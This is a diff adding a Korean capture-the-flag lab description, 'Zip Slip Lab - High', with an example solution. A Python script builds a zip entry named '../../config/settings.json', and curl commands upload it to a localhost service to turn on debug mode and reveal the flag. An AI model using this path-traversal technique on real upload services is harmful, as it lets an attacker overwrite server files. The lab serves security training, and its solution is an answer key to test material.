@@ -1,0 +1,35 @@
+📌 문제 제목
+Zip Slip Lab - High
+
+🎯 문제 설명
+이 서비스는 "테마 패키지" zip 파일을 업로드하면 서버가 압축을 풀어 적용해줍니다. 서버는
+업로드된 zip의 각 항목(entry) 이름을 검증 없이 그대로 사용해 파일을 저장합니다.
+
+zip 항목 이름에 `../`를 넣으면, 서버가 의도한 업로드 디렉터리를 벗어난 위치에 파일을 쓸 수
+있습니다 (Zip Slip). 서버에는 `/app/config/settings.json`이라는 설정 파일이 있고, 이 값이
+`{"debug": true}`가 되면 `/debug` 엔드포인트가 flag를 반환합니다.
+
+당신의 목표는 이 설정 파일을 zip slip으로 덮어써서 디버그 모드를 켜는 것입니다.
+
+🧠 난이도
+상 (High)
+
+💡 힌트
+- 일반적인 zip 압축 도구(GUI, 탐색기)로는 `../`가 포함된 항목 이름을 만들기 어렵습니다 -
+  직접 스크립트로 zip을 조작해야 합니다.
+- 업로드 디렉터리는 `/app/themes/<임의의id>/`입니다. `/app/config/settings.json`까지
+  가려면 몇 단계 위로 올라가야 할까요?
+
+💡 예시 풀이 (Python)
+```python
+import zipfile
+
+with zipfile.ZipFile("evil_theme.zip", "w") as zf:
+    info = zipfile.ZipInfo("../../config/settings.json")
+    zf.writestr(info, '{"debug": true}')
+```
+```bash
+curl -F "theme=@evil_theme.zip;type=application/zip" http://localhost:8000/upload
+curl http://localhost:8000/debug
+```
+정상적으로 성공하면 `/debug`가 `{"debug": true, "flag": "FLAG{...}"}`를 반환합니다.
